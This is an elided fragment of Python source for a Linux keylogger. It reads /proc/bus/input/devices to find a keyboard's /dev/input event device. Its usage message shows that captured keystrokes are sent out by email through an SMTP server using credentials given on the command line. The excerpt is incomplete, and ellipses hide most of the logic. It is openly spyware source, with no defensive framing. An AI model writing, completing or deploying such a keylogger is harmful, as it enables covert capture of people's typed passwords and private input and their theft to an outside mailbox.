...
def main():
    with open("/proc/bus/input/devices") as f:
        ...
        infile_path = f"/dev/input/{pattern.search(line).group(0)}"
...
def usage():
    print(
        "Usage: ./keylogger [your EMAIL] [YOUR PASSWORD] [smtp server] [tls/notls] [buffer_size]")
